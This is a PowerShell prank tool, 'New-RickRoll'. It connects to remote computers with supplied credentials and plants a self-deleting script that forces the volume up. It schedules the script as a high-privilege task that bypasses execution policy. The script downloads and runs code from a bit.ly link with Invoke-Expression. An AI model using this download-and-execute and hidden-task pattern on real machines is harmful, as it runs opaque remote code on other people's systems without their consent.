<#
    .SYNOPSIS
        This Function is designed to RickRoll a specified target(s).
    .DESCRIPTION
        This Function will RickRoll a specified target(s) by doing the following:
            1. Connect to the specified remote computer(s)
            2. Use Get-CimInstance to return the logged on user
            3. Create a file containing:
                a. The RickRoll expression to be run
                b. Code to remove the script after run
            4. Unless otherwise specified, return a time value between 2 and 30 minutes from execution
            5. Using the information gathered above, create a scheduled task that:
                a. Runs the RickRoll file in PowerShell interactively as the logged on user at the designated time,
                    and deletes both the scheduled task, and file after the task is ran.
    .PARAMETER ComputerName
        String array of targets to RickRoll
    .PARAMETER DelayMinutes
        Random value between 2 and 30, unless specified, used to calculate the run time of the RickRoll

        Cannot be used with -NoWait
    .PARAMETER FileDirectory
        Location to place the RickRoll File. Default is $env:PUBLIC\Documents
    .PARAMETER TaskName
        Name of the Scheduled Task to be created. Also used as the RickRoll file Name. Default is 'RickRoll'.
        Cannot contain characters: / \ : * ? " < > |
    .PARAMETER VolumeLevel
        Value to set volume level of remote computer to. Integer value between 1 and 100. Default is 50.
    .PARAMETER NoWait
        Immediately runs the scheduled task instead of delaying the run

        Cannot be used with -DelayMinutes
    .EXAMPLE
        New-RickRoll -ComputerName PC1
        
        Prompts for credentials with rights to connect to PC1 and creates the scheduled task that runs in (2-30) minutes.
    .EXAMPLE
        New-RickRoll -ComputerName PC1,PC2 -DelayMinutes 5 -TaskName RR -VolumeLevel 50

        Prompts for credentials (once) to connect to PC1 & PC2, then creates the task 'RR' that runs in 5 minutes on each machine.
        When run, the volume of the remote computer is set to 50, and reverted after run.
    .EXAMPLE
        New-RickRoll -ComputerName PC3 -NoWait
                
        Prompts for credentials to conenct to PC3, creates the 'RickRoll' task, then runs it immediately.
    .LINK
        Archive.org link to original post that inspired this function
        https://web.archive.org/web/20230610101433/https://old.reddit.com/r/PowerShell/comments/8mz7d2/iex_newobject/
    .LINK
        SS64 article on SCHTASKS syntax
        https://ss64.com/nt/schtasks.html
    .LINK
        The bitly link in this function (http://bit.ly/e0Mw9w) redirects here.
            This contains the bas64 string and ASCII display for the video
        Original: https://www.leeholmes.com/projects/ps_html5/Invoke-PSHtml5.ps1
        Archive : https://web.archive.org/web/20240105173826/https://www.leeholmes.com/projects/ps_html5/Invoke-PSHtml5.ps1
    .LINK
        This is the link to the background audio for the video
        Original: https://www.leeholmes.com/projects/ps_html5/background.mp3
        Archive : https://web.archive.org/web/20240105174121/https://www.leeholmes.com/projects/ps_html5/background.mp3
    .NOTES
        Author			Jacob C Allen
        Created			05-31-2018
        Modified		01-05-2024
        Modified By     Jacob C Allen
        Version			2.1.1
#>
Function New-RickRoll {
    [CmdLetBinding(DefaultParameterSetName = 'Scheduled')]
    Param (
        [Parameter(ParameterSetName = 'Scheduled',Mandatory)]
        [Parameter(ParameterSetName = 'Immediate',Mandatory)]
            [String[]]$ComputerName,
        [Parameter(ParameterSetName = 'Scheduled')]
        [Alias('Minutes','Delay')]
        [ValidateRange(1,90)]
            [Int]$DelayMinutes = $(Get-Random -Min 2 -Max 30),
        [Parameter(ParameterSetName = 'Scheduled')]
        [Parameter(ParameterSetName = 'Immediate')]
            [String]$FileDirectory = "$env:PUBLIC\Documents",
        [Parameter(ParameterSetName = 'Scheduled')]
        [Parameter(ParameterSetName = 'Immediate')]
        [ValidatePattern('^[^\/\\\:\*\?\"\<\>\|]+$')]
            <# 
                Pattern explination: Start at beginning of word (^).
                Match any character except: /\:*?"<> ([^\/\\\:\*\?\"\<\>\|])
                Matches 1-unlimited times (+).
                Matches until end of line ($).
            #> 
            [String]$TaskName = 'RickRoll',
        [Parameter(ParameterSetName = 'Scheduled')]
        [Parameter(ParameterSetName = 'Immediate')]
        [ValidateRange(1,100)]
            [Int]$VolumeLevel = 50,
        [Parameter(ParameterSetName = 'Immediate')]
            [Switch]$NoWait
    )
    Begin {
        Write-Host 'Credentials are only needed once' -ForegroundColor Green
        #####################################################################
        ## Asks for credentials with access to remotely connect each time. ##
       <##>                $Credential = (Get-Credential)                 <##>
        ##   To discourage running this too often, I left this here.       ##
        #####################################################################
    }
    Process {
        $FilePath = "$FileDirectory\$TaskName.ps1"
        
        
        # Loop through each computer in the $ComputerName array
        $results = [System.Collections.ArrayList]::New()
        ForEach ($C in $ComputerName) {
            # Verify the computer is reachable
            If (Test-Connection -ComputerName $C -Count 2 -Quiet) {
                $invokeResults = Invoke-Command -ComputerName $C -ScriptBlock {
                    #region Invoke Begin
                        # Check for any previous files that didn't get removed
                        If (Test-Path -Path $Using:FilePath) {
                            Remove-Item -Path $Using:FilePath -Force
                        }
                        #region Audio Type Definition
                            # Creates the [Audio] type
                            $AudioType = 'Add-Type -TypeDefinition @"
                                using System.Runtime.InteropServices;
                            
                                [Guid("5CDF2C82-841E-4546-9722-0CF74078229A"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
                                interface IAudioEndpointVolume {
                                // f(), g(), ... are unused COM method slots. Define these if you care
                                int f(); int g(); int h(); int i();
                                int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext);
                                int j();
                                int GetMasterVolumeLevelScalar(out float pfLevel);
                                int k(); int l(); int m(); int n();
                                int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext);
                                int GetMute(out bool pbMute);
                                }
                                [Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
                                interface IMMDevice {
                                int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);
                                }
                                [Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
                                interface IMMDeviceEnumerator {
                                int f(); // Unused
                                int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);
                                }
                                [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }
                            
                                public class Audio {
                                static IAudioEndpointVolume Vol() {
                                    var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;
                                    IMMDevice dev = null;
                                    Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev));
                                    IAudioEndpointVolume epv = null;
                                    var epvid = typeof(IAudioEndpointVolume).GUID;
                                    Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv));
                                    return epv;
                                }
                                public static float Volume {
                                    get {float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v;}
                                    set {Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty));}
                                }
                                public static bool Mute {
                                    get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; }
                                    set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); }
                                }
                                }
"@'
                        #endregion Audio Type Definition

                        #####################################################################
                        ## [Audio] uses volume levels between 0 (0%) and 1 (100%)          ##
                        ## So the [Int]$VolumeLevel needs to be converted to [Decimal]$Vol ##
                        ##     e.g. [Int]75 --> [Decimal].75                               ##
                        #####################################################################
                        [Decimal]$Vol = ($Using:VolumeLevel / 100)
                                               
                        # Returns the current logged on user
                        $runUser  = Get-CimInstance -ClassName Win32_ComputerSystem | ForEach-Object {$PSItem.Username}
                        # Sets the time in the format used by 'schtasks.exe'
                        $runDelay = Switch ($Using:PSCmdlet.ParameterSetName) {
                            'Scheduled' {
                                $Using:DelayMinutes
                            }
                            'Immediate' {
                                # This is an arbitrary number and will not be used
                                #   since the task will run immediately after creation
                                2
                            }
                        }
                        $runTime  = (Get-Date).AddMinutes($runDelay).ToString("HH:mm")
                    #endregion Invoke Begin
                    
                    #region Invoke Process
                        #region Create RickRoll File    
                        Set-Content -Path $Using:FilePath -Value @"
[String]`$s = [Char]32
Write-Host (`$s * 73) -ForegroundColor Green -BackgroundColor Black
Write-Host (`$s * 73) -ForegroundColor Green -BackgroundColor Black

Write-Host (`$s * 7) -NoNewline -ForegroundColor Green -BackgroundColor Black
Write-Host ("~ " * 28) -NoNewline -ForegroundColor Green -BackgroundColor Black
Write-Host ("~" + (`$s * 9)) -ForegroundColor Green -BackgroundColor Black

Write-Host ((`$s * 7) + "!!!              PLEASE DON''T CLOSE ME"+(`$s * 16) + "!!!" + (`$s * 9)) -ForegroundColor Green -BackgroundColor Black;
Write-Host "       !!!    Something" -NoNewLine -ForegroundColor Green -BackgroundColor Black;
Write-Host " M" -NoNewLine -ForegroundColor Yellow -BackgroundColor Black;
Write-Host " A" -NoNewLine -ForegroundColor Cyan -BackgroundColor Black;
Write-Host " G" -NoNewLine -ForegroundColor White -BackgroundColor Black;
Write-Host " I" -NoNewLine -ForegroundColor Red -BackgroundColor Black;
Write-Host " C" -NoNewLine -ForegroundColor White -BackgroundColor Black;
Write-Host " A" -NoNewLine -ForegroundColor Blue -BackgroundColor Black;
Write-Host " L " -NoNewLine -ForegroundColor Magenta -BackgroundColor Black;
Write-Host ("is about to happen     !!!" + (`$s * 9)) -ForegroundColor Green -BackgroundColor Black

Write-Host (`$s * 7) -NoNewline -ForegroundColor Green -BackgroundColor Black
Write-Host ("~ " * 28) -NoNewline -ForegroundColor Green -BackgroundColor Black
Write-Host ("~" + (`$s * 9)) -ForegroundColor Green -BackgroundColor Black

Write-Host (`$s * 73) -ForegroundColor Green -BackgroundColor Black
Write-Host (`$s * 73) -ForegroundColor Green -BackgroundColor Black

$AudioType
# Grabs the current Volume Level and Mute settings
`$CurrentMute =  [Audio]::Mute
`$CurrentVol  =   [Audio]::Volume

# Unmutes the system and changes the volume to the value set in `$Vol (Default .75 or 75%)
[Audio]::Mute = `$False
[Audio]::Volume = $Vol

Invoke-Expression -Command (New-Object Net.WebClient).DownloadString('http://bit.ly/e0Mw9w')

`$Null = Remove-Item $($Using:FilePath) -Force

# Reverts the Volume level and Mute settings after the RickRoll runs
[Audio]::Volume = `$CurrentVol
[Audio]::Mute   = `$CurrentMute
"@ -Force
                        #endregion Create RickRoll File

                        # Create the scheduled task that runs the RickRoll file, using schtasks.exe
                        $Null = (schtasks.exe /Create /TN "$($Using:TaskName)" /SC Once /TR "powershell -NoP -NoL -Ex Bypass -File $($Using:FilePath)" /ST $runTime /RU "$runUser" /IT /RL HIGHEST /V1 /Z /F)
                        <#
                            /------------------------------------------------------------------------------------------------------------------------\
                            | Arugument explanation                                                                                                   | 
                            |   /Create(Creates Task)                       |   /TN(Task Name)      |   /SC(Schedule [Once|Daily|Weekly|Monthly|etc]) |
                            |   /TR(Task Run - What to do when ran)         |   /ST(Start Time)     |   /RU(Run User - Account to RunAs)              |
                            |   /IT(Interactive - Allows User to interact)  |   /RL(Task priority)  |   /V1(Compatibility)                            |
                            |   /Z(Delete Task after Final Run)             |   /F(Force)           |                                                 |
                            \------------------------------------------------------------------------------------------------------------------------/
                        #>

                        If ($Using:PSCmdlet.ParameterSetName -eq 'Immediate') {
                            $Null = (schtasks.exe /Run /TN "$($Using:TaskName)")
                            <#
                                /--------------------------------------------------------\
                                | Argument explanation                                   |
                                |   /Run(Run specified task on demand)  | /TN(Task Name) |
                                \--------------------------------------------------------/
                            #>
                            $Null = (schtasks.exe /Delete /TN "$($Using:TaskName)" /F)
                            <#
                                /----------------------------------------------------------------\
                                | Argument explanation                                           |
                                |   /Delete(Delete specified task)  | /TN(Task Name) | /F(Force) |
                                \----------------------------------------------------------------/
                            #>
                        }
                    #endregion Invoke Process

                    #region Invoke End
                        Switch ($Using:PSCmdlet.ParameterSetName) {
                            'Scheduled' {
                                [PSCustomObject]@{
                                    User = $runUser
                                    Time = $runTime
                                }
                            }
                            'Immediate' {
                                [PSCustomObject]@{
                                    User = $runUser
                                    Time = ('{0} (Now)' -F $runTime)
                                }
                            }
                        }
                        
                    #endregion Invoke End
                } -Credential $Credential
                    # Invoke-Command
            } Else {
                Write-Warning ('Unable to connect to {0}!' -F $C)
                Write-Warning 'Computer is offline or unreachable!'
                Break
            } # Test-Connection
         
            [Void]$results.Add((
                [PSCustomObject]@{
                    'Run User'  = $invokeResults.User
                    'Run Time'  = $invokeResults.Time
                    'Computer'  = $invokeResults.PSComputerName
                }))
        } # ForEach Computer
    } # Process Block
    
    End {
        $results
    } # End Block
} # Function New-RickRoll